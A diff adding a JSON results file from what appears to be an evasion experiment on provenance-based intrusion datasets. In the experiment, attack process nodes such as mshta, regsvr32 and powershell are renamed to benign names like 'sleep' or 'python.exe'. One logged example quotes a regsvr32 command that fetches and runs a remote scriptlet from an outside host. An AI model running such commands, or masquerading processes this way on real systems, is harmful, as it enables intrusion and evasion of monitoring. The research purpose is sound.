@@ -1,0 +1,181 @@
+{
+ "CADETS_E3": {
+  "targets": [
+   {
+    "key": "XIM",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "main",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "minions",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "pEja72mA",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "test",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 4
+   },
+   {
+    "key": "tmux-1002",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "vUgefal",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 1
+   }
+  ],
+  "renamed_nodes": 13,
+  "renamed_gt": 13,
+  "still_unknown": 0,
+  "baseline_programs": 112,
+  "baseline_processes": 137761,
+  "top_shell": "sh",
+  "top_process": "sleep",
+  "examples": [
+   {
+    "before": "subject None vUgefal",
+    "after": "subject None sleep",
+    "gt": true
+   },
+   {
+    "before": "subject None tmux-1002",
+    "after": "subject None sleep",
+    "gt": true
+   },
+   {
+    "before": "subject None tmux-1002",
+    "after": "subject None sleep",
+    "gt": true
+   }
+  ],
+  "set": "CADETS_E3",
+  "N": 469579,
+  "registry": 643486,
+  "test_nodes": 281585
+ },
+ "CLEARSCOPE_E3": {
+  "targets": [],
+  "renamed_nodes": 0,
+  "renamed_gt": 0,
+  "still_unknown": 0,
+  "baseline_programs": 33,
+  "baseline_processes": 827,
+  "top_shell": null,
+  "top_process": "com.android.quicksearchbox",
+  "examples": [],
+  "set": "CLEARSCOPE_E3",
+  "N": 132161,
+  "registry": 236946,
+  "test_nodes": 111403
+ },
+ "ATLASV2_EDR-h1": {
+  "targets": [
+   {
+    "key": "/windows/system32/mshta.exe",
+    "kind": "shell",
+    "gt_nodes": 6,
+    "replacement_key": "/python27/python.exe",
+    "replacement": "c:\\python27\\python.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 14,
+    "renamed_nodes": 6
+   },
+   {
+    "key": "/windows/system32/regsvr32.exe",
+    "kind": "process",
+    "gt_nodes": 5,
+    "replacement_key": "/program",
+    "replacement": "c:\\program",
+    "fallback_to_process": false,
+    "baseline_runs": 25106,
+    "renamed_nodes": 5
+   },
+   {
+    "key": "/windows/system32/windowspowershell/{v}/powershell.exe",
+    "kind": "shell",
+    "gt_nodes": 8,
+    "replacement_key": "/python27/python.exe",
+    "replacement": "c:\\python27\\python.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 14,
+    "renamed_nodes": 8
+   }
+  ],
+  "renamed_nodes": 19,
+  "renamed_gt": 19,
+  "still_unknown": 0,
+  "baseline_programs": 67,
+  "baseline_processes": 26643,
+  "top_shell": "/python27/python.exe",
+  "top_process": "/program",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\regsvr32.exe None",
+    "after": "subject c:\\program None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+    "after": "subject c:\\program program /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None",
+    "after": "subject c:\\python27\\python.exe None",
+    "gt": true
+   }
+  ],
+  "set": "ATLASV2_EDR-h1",
+  "N": 421919,
+  "registry": 528178,
+  "test_nodes": 108746
+ }
+}
